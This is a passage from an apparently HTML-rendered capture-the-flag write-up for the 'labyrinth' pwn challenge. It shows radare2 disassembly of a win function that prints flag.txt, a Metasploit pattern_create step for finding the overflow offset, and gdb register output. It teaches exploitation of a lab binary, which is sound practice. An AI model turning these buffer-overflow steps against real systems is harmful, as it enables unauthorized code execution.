</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">r2</span> <span class="n">labyrinth</span>                                                                             
</span></span><span class="line"><span class="cl"> <span class="o">--</span> <span class="err"></span><span class="o">|&lt;|&lt;|</span>  <span class="o">-</span><span class="p">(</span> <span class="n">glu</span> <span class="n">glu</span> <span class="n">glu</span><span class="p">,</span> <span class="n">im</span> <span class="n">the</span> <span class="n">r2</span> <span class="n">fish</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mh">0x00401140</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">aaaa</span>
</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Analyze</span> <span class="n">all</span> <span class="n">flags</span> <span class="n">starting</span> <span class="n">with</span> <span class="n">sym</span><span class="o">.</span> <span class="ow">and</span> <span class="n">entry0</span> <span class="p">(</span><span class="n">aa</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Analyze</span> <span class="n">all</span> <span class="n">functions</span> <span class="n">arguments</span><span class="o">/</span><span class="n">locals</span> <span class="p">(</span><span class="n">afva</span><span class="err">@@@</span><span class="n">F</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Analyze</span> <span class="n">function</span> <span class="n">calls</span> <span class="p">(</span><span class="n">aac</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Analyze</span> <span class="n">len</span> <span class="n">bytes</span> <span class="n">of</span> <span class="n">instructions</span> <span class="k">for</span> <span class="n">references</span> <span class="p">(</span><span class="n">aar</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Finding</span> <span class="ow">and</span> <span class="n">parsing</span> <span class="n">C</span><span class="o">++</span> <span class="n">vtables</span> <span class="p">(</span><span class="n">avrr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Type</span> <span class="n">matching</span> <span class="n">analysis</span> <span class="k">for</span> <span class="n">all</span> <span class="n">functions</span> <span class="p">(</span><span class="n">aaft</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Propagate</span> <span class="n">noreturn</span> <span class="n">information</span> <span class="p">(</span><span class="n">aanr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Scanning</span> <span class="k">for</span> <span class="n">strings</span> <span class="n">constructed</span> <span class="ow">in</span> <span class="n">code</span> <span class="p">(</span><span class="o">/</span><span class="n">azs</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Finding</span> <span class="n">function</span> <span class="n">preludes</span> <span class="p">(</span><span class="n">aap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">anal</span><span class="o">.</span><span class="n">types</span><span class="o">.</span><span class="n">constraint</span> <span class="k">for</span> <span class="n">experimental</span> <span class="n">type</span> <span class="n">propagation</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mh">0x00401140</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">afl</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401140</span>    <span class="mi">1</span>     <span class="mi">42</span> <span class="n">entry0</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401180</span>    <span class="mi">4</span>     <span class="mi">31</span> <span class="n">sym</span><span class="o">.</span><span class="n">deregister_tm_clones</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x004011b0</span>    <span class="mi">4</span>     <span class="mi">49</span> <span class="n">sym</span><span class="o">.</span><span class="n">register_tm_clones</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x004011f0</span>    <span class="mi">3</span>     <span class="mi">28</span> <span class="n">sym</span><span class="o">.</span><span class="n">__do_global_dtors_aux</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401220</span>    <span class="mi">1</span>      <span class="mi">2</span> <span class="n">sym</span><span class="o">.</span><span class="n">frame_dummy</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401670</span>    <span class="mi">1</span>      <span class="mi">1</span> <span class="n">sym</span><span class="o">.</span><span class="n">__libc_csu_fini</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401255</span>    <span class="mi">5</span>    <span class="mi">208</span> <span class="n">sym</span><span class="o">.</span><span class="n">escape_plan</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401030</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">putchar</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401130</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">fwrite</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x004010c0</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">fprintf</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x004010f0</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">open</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401100</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">perror</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401120</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">exit</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401090</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">fputc</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x004010a0</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">read</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401080</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">close</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401674</span>    <span class="mi">1</span>      <span class="mi">9</span> <span class="n">sym</span><span class="o">.</span><span class="n">_fini</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x0040137b</span>    <span class="mi">1</span>     <span class="mi">51</span> <span class="n">sym</span><span class="o">.</span><span class="n">banner</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401050</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">puts</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401610</span>    <span class="mi">4</span>     <span class="mi">93</span> <span class="n">sym</span><span class="o">.</span><span class="n">__libc_csu_init</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401222</span>    <span class="mi">1</span>     <span class="mi">51</span> <span class="n">sym</span><span class="o">.</span><span class="n">cls</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401060</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">printf</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401170</span>    <span class="mi">1</span>      <span class="mi">1</span> <span class="n">sym</span><span class="o">.</span><span class="n">_dl_relocate_static_pie</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401405</span>   <span class="mi">15</span>    <span class="mi">510</span> <span class="n">main</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401325</span>    <span class="mi">1</span>     <span class="mi">86</span> <span class="n">sym</span><span class="o">.</span><span class="n">read_num</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401110</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">strtoul</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401000</span>    <span class="mi">3</span>     <span class="mi">23</span> <span class="n">sym</span><span class="o">.</span><span class="n">_init</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x004013ae</span>    <span class="mi">1</span>     <span class="mi">87</span> <span class="n">sym</span><span class="o">.</span><span class="n">setup</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x004010e0</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">setvbuf</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401070</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">alarm</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x00401040</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">strncmp</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x004010b0</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">fgets</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x004010d0</span>    <span class="mi">1</span>      <span class="mi">6</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">malloc</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>sym.escape_plan</code> looks interesting by name, and the size also suggests there might be a few things going on.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">pdf</span> <span class="err">@</span> <span class="n">sym</span><span class="o">.</span><span class="n">escape_plan</span> 
</span></span><span class="line"><span class="cl"><span class="err"></span> <span class="mi">208</span><span class="p">:</span> <span class="n">sym</span><span class="o">.</span><span class="n">escape_plan</span> <span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="p">;</span> <span class="k">var</span> <span class="n">uint32_t</span> <span class="n">fildes</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="p">;</span> <span class="k">var</span> <span class="n">void</span> <span class="o">*</span><span class="n">buf</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x5</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x00401255</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x00401256</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x00401259</span>      <span class="mi">4883</span><span class="n">ec10</span>       <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x10</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x0040125d</span>      <span class="n">bf0a000000</span>     <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="mh">0xa</span>                <span class="p">;</span> <span class="ne">int</span> <span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x00401262</span>      <span class="n">e8c9fdffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">putchar</span>        <span class="p">;</span> <span class="ne">int</span> <span class="n">putchar</span><span class="p">(</span><span class="ne">int</span> <span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x00401267</span>      <span class="mi">488</span><span class="n">b05a22d00</span><span class="o">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">obj</span><span class="o">.</span><span class="n">stdout</span><span class="p">]</span> <span class="p">;</span> <span class="n">obj</span><span class="o">.</span><span class="n">__TMC_END__</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>                                                                      <span class="p">;</span> <span class="p">[</span><span class="mh">0x404010</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span><span class="o">=</span><span class="mi">0</span>                             
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x0040126e</span>      <span class="mi">4889</span><span class="n">c1</span>         <span class="n">mov</span> <span class="n">rcx</span><span class="p">,</span> <span class="n">rax</span>                <span class="p">;</span> <span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x00401271</span>      <span class="n">baf0010000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x1f0</span>              <span class="p">;</span> <span class="mi">496</span> <span class="p">;</span> <span class="n">size_t</span> <span class="n">nitems</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x00401276</span>      <span class="n">be01000000</span>     <span class="n">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="mi">1</span>                  <span class="p">;</span> <span class="n">size_t</span> <span class="n">size</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x0040127b</span>      <span class="mi">488</span><span class="n">d3d960d00</span><span class="o">.</span>  <span class="n">lea</span> <span class="n">rdi</span><span class="p">,</span> <span class="nb">str</span><span class="o">.</span><span class="n">________________O_________________n___________________________________n__________________________________n____n_______________________________n_______________________________n_______________________________n_______________________________n_n</span> <span class="p">;</span> <span class="mh">0x402018</span> <span class="p">;</span> <span class="s2">&#34;                \O/               </span><span class="se">\n</span><span class="s2">                 |                 </span><span class="se">\n</span><span class="s2">                / \               </span><span class="se">\n\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592</span><span class="s2">   </span><span class="se">\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\u2592</span><span class="s2">-</span><span class="se">\u25b8</span><span class="s2">        </span><span class="se">\u2592</span><span class="s2">           </span><span class="se">\u2592</span><span class="s2">          </span><span class="se">\u2592\n\u2592</span><span class="s2">-</span><span class="se">\u25b8</span><span class="s2">        </span><span class="se">\u2592</span><span class="s2">           </span><span class="se">\u2592</span><span class="s2">          </span><span class="se">\u2592\n\u2592</span><span class="s2">-</span><span class="se">\u25b8</span><span class="s2">        </span><span class="se">\u2592</span><span class="s2">           </span><span class="se">\u2592</span><span class="s2">          </span><span class="se">\u2592\n\u2592</span><span class="s2">-</span><span class="se">\u25b8</span><span class="s2">        </span><span class="se">\u2592</span><span class="s2">           </span><span class="se">\u2592</span><span class="s2">          </span><span class="se">\u2592\n\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\xe2</span><span class="s2">&#34;</span> <span class="p">;</span> <span class="k">const</span> <span class="n">void</span> <span class="o">*</span><span class="n">ptr</span>           
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x00401282</span>      <span class="n">e8a9feffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">fwrite</span>         <span class="p">;</span> <span class="n">size_t</span> <span class="n">fwrite</span><span class="p">(</span><span class="k">const</span> <span class="n">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">nitems</span><span class="p">,</span> <span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">)</span>                                                                                       
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x00401287</span>      <span class="mi">488</span><span class="n">b05822d00</span><span class="o">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">obj</span><span class="o">.</span><span class="n">stdout</span><span class="p">]</span> <span class="p">;</span> <span class="n">obj</span><span class="o">.</span><span class="n">__TMC_END__</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>                                                                      <span class="p">;</span> <span class="p">[</span><span class="mh">0x404010</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span><span class="o">=</span><span class="mi">0</span>                             
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x0040128e</span>      <span class="mi">488</span><span class="n">d0d740f00</span><span class="o">.</span>  <span class="n">lea</span> <span class="n">rcx</span><span class="p">,</span> <span class="nb">str</span><span class="o">.</span><span class="n">e_0m</span>           <span class="p">;</span> <span class="mh">0x402209</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x00401295</span>      <span class="mi">488</span><span class="n">d15720f00</span><span class="o">.</span>  <span class="n">lea</span> <span class="n">rdx</span><span class="p">,</span> <span class="nb">str</span><span class="o">.</span><span class="n">e_1_32m</span>        <span class="p">;</span> <span class="mh">0x40220e</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x0040129c</span>      <span class="mi">488</span><span class="n">d35750f00</span><span class="o">.</span>  <span class="n">lea</span> <span class="n">rsi</span><span class="p">,</span> <span class="nb">str</span><span class="o">.</span><span class="n">_n_sCongratulations_on_escaping__Here_is_a_sacred_spell_to_help_you_continue_your_journey</span><span class="p">:</span><span class="n">__s_n</span> <span class="p">;</span> <span class="mh">0x402218</span> <span class="p">;</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="si">%s</span><span class="s2">Congratulations on escaping! Here is a sacred spell to help you continue your journey: </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="p">;</span> <span class="k">const</span> <span class="n">char</span> <span class="o">*</span><span class="n">format</span>                                                                 
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x004012a3</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>                <span class="p">;</span> <span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x004012a6</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x004012ab</span>      <span class="n">e810feffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">fprintf</span>        <span class="p">;</span> <span class="ne">int</span> <span class="n">fprintf</span><span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span>   <span class="o">...</span><span class="p">)</span>                                                                                                           
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x004012b0</span>      <span class="n">be00000000</span>     <span class="n">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="mi">0</span>                  <span class="p">;</span> <span class="ne">int</span> <span class="n">oflag</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x004012b5</span>      <span class="mi">488</span><span class="n">d3dba0f00</span><span class="o">.</span>  <span class="n">lea</span> <span class="n">rdi</span><span class="p">,</span> <span class="nb">str</span><span class="o">..</span><span class="n">_flag</span><span class="o">.</span><span class="n">txt</span>     <span class="p">;</span> <span class="mh">0x402276</span> <span class="p">;</span> <span class="s2">&#34;./flag.txt&#34;</span> <span class="p">;</span> <span class="k">const</span> <span class="n">char</span> <span class="o">*</span><span class="n">path</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x004012bc</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x004012c1</span>      <span class="n">e82afeffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="o">.</span><span class="n">imp</span><span class="o">.</span><span class="n">open</span>           <span class="p">;</span> <span class="ne">int</span> <span class="n">open</span><span class="p">(</span><span class="k">const</span> <span class="n">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="ne">int</span> <span class="n">oflag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x004012c6</span>      <span class="mi">8945</span><span class="n">fc</span>         <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">fildes</span><span class="p">],</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>           <span class="mh">0x004012c9</span>      <span class="mi">837</span><span class="n">dfc00</span>       <span class="n">cmp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">fildes</span><span class="p">],</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>       <span class="err"></span><span class="o">&lt;</span> <span class="mh">0x004012cd</span>      <span class="mi">792</span><span class="n">e</span>           <span class="n">jns</span> <span class="mh">0x4012fd</span>
</span></span><span class="line"><span class="cl"><span class="err"></span>       <span class="err"></span>   <span class="mh">0x004012cf</span>      <span class="mi">488</span><span class="n">d3db20f00</span><span class="o">.</span>  <span class="n">lea</span> <span class="n">rdi</span><span class="p">,</span> <span class="nb">str</span><span class="o">.</span><span class="n">_nError_opening_flag</span><span class="o">.</span><span class="n">txt__please_contact_an_Administrator</span><span class="o">.</span><span class="n">_n_n</span> <span class="p">;</span> <span class="mh">0x402288</span> <span class="p">;</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Error opening flag.txt, please contact an Administrator.</span><span class="se">\n\n</span><span class="s2">&#34;</span> <span class="p">;</span> <span class="k">const</span> <span class="n">char</span> <span class="o">*</span><span class="n">s</span>                    
</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see a victory text at address <code>0x0040129c</code>. A little further down we can see actions to open and print the flag.txt. If we can return tho this address, we might be able to produce a victory screen. Firstly, to determine the offset of the overflow:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">pattern_create</span><span class="o">.</span><span class="n">rb</span> <span class="o">-</span><span class="n">l</span> <span class="mi">300</span>               
</span></span><span class="line"><span class="cl"><span class="n">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>running in gdb:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[----------------------------------registers-----------------------------------]
</span></span><span class="line"><span class="cl">RAX: 0x0 
</span></span><span class="line"><span class="cl">RBX: 0x0 
</span></span><span class="line"><span class="cl">RCX: 0x7ffff7d14a37 (&lt;write+23&gt;:        cmp    rax,0xfffffffffffff000)
</span></span><span class="line"><span class="cl">RDX: 0x0 
</span></span><span class="line"><span class="cl">RSI: 0x7fffffffbc20 --&gt; 0x6d31333b315b1b0a 
</span></span><span class="line"><span class="cl">RDI: 0x7fffffffbb00 --&gt; 0x7ffff7c620d0 (&lt;funlockfile&gt;:  endbr64)
</span></span><span class="line"><span class="cl">RBP: 0x5f6e726574746170 (&#39;pattern_&#39;)
</span></span><span class="line"><span class="cl">RSP: 0x7fffffffdd78 (&#34;create.rb -&#34;)
</span></span><span class="line"><span class="cl">RIP: 0x401602 (&lt;main+509&gt;:      ret)
</span></span><span class="line"><span class="cl">R8 : 0x23 (&#39;#&#39;)
</span></span><span class="line"><span class="cl">R9 : 0x7ffff7d7cd70 (mov    r10,QWORD PTR [rsi-0x1b])
</span></span><span class="line"><span class="cl">R10: 0x20554f59205d2d5b (&#39;[-] YOU &#39;)
</span></span><span class="line"><span class="cl">R11: 0x246 
</span></span><span class="line"><span class="cl">R12: 0x7fffffffde88 --&gt; 0x7fffffffe1da (&#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth&#34;)
</span></span><span class="line"><span class="cl">R13: 0x401405 (&lt;main&gt;:  push   rbp)
</span></span><span class="line"><span class="cl">R14: 0x0 
</span></span><span class="line"><span class="cl">R15: 0x7ffff7ffd040 --&gt; 0x7ffff7ffe2e0 --&gt; 0x0
</span></span><span class="line"><span class="cl">EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
</span></span><span class="line"><span class="cl">[-------------------------------------code-------------------------------------]
</span></span><span class="line"><span class="cl">   0x4015f7 &lt;main+498&gt;: call   0x4010c0 &lt;fprintf@plt&gt;
</span></span><span class="line"><span class="cl">   0x4015fc &lt;main+503&gt;: mov    eax,0x0
</span></span><span class="line"><span class="cl">   0x401601 &lt;main+508&gt;: leave
</span></span><span class="line"><span class="cl">=&gt; 0x401602 &lt;main+509&gt;: ret
</span></span><span class="line"><span class="cl">   0x401603:    cs nop WORD PTR [rax+rax*1+0x0]
</span></span><span class="line"><span class="cl">   0x40160d:    nop    DWORD PTR [rax]
</span></span><span class="line"><span class="cl">   0x401610 &lt;__libc_csu_init&gt;:  push   r15
</span></span><span class="line"><span class="cl">   0x401612 &lt;__libc_csu_init+2&gt;:        lea    r15,[rip+0x2727]        # 0x403d40
</span></span><span class="line"><span class="cl">[------------------------------------stack-------------------------------------]
</span></span><span class="line"><span class="cl">0000| 0x7fffffffdd78 (&#34;create.rb -&#34;)
